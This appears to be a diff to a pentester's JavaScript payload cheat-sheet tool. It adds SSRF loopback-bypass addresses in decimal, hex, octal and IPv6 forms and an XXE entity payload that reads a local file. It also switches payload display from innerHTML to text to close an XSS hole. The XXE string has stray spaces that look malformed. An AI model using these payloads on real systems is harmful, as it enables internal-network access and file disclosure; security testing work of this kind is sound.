@@ -26,13 +26,30 @@ const payloads = {
     },
     "SSRF": {
         "IP": [
-            ""
+            "127.0.0.1",
+            "localhost",
+            "127.0.1",
+            "127.1",
+            "0.0.0.0",
+            "0.0",
+            "0",
+            "::1",
+            "::127.0.0.1",
+            "::ffff:127.0.0.1",
+            "::1%1",
+            "127.12.34.56 (127.0.0.1/8)",
+            "127.0.0.1.xip.io",
+            "http://2130706433 (decimal)",
+            "http://0x7f000001",
+            "http://017700000001",
+            "http://0x7f.0x0.0x0.0x1",
+            "http://0177.0.0.1",
+            "http://0177.01.01.01",
+            "http://0x7f.1",
+            "http://[::]"
         ]
     },
     "SSTI": {
-        "flow": [
-            "<img src=\"https://camo.githubusercontent.com/e181cc488687817780ecc81ef6bbd57be7b2a2c5/68747470733a2f2f692e696d6775722e636f6d2f47565a655671362e706e67\">"
-        ],
         "Payload": [
             "${7*7}",
             "{{7*}}",
@@ -69,6 +86,11 @@ const payloads = {
         ],
         "Locator": [
             "'';!--\"<XSS>=&{()}"
+        ]
+    },
+    "XXE": {
+        "basic": [
+            "<?xml version= \"1.0\" encoding= \"utf - 8\"?><!DOCTYPE ANY[< !ENTITY name SYSTEM \"file:///file/to/path\">]><foo><bar>&name;</bar></foo>"
         ]
     }
 }
@@ -111,7 +133,7 @@ $('.payload-select').change(e=>{
     const ps = payloads[id][value];
     for(let i in ps){
         let msg = $('<div class="ui olive message payload-message"></div>');
-        let pay = $('<div class="payload"></div>').innerHTML = ps[i];
+        let pay = $('<div class="payload"></div>').text(ps[i]);
         let co = $('<div class="ui icon button copy-button" data-tooltip="COPY"><i class="copy outline icon"></i></div>');
         co.click(()=>{
             copy(ps[i]);
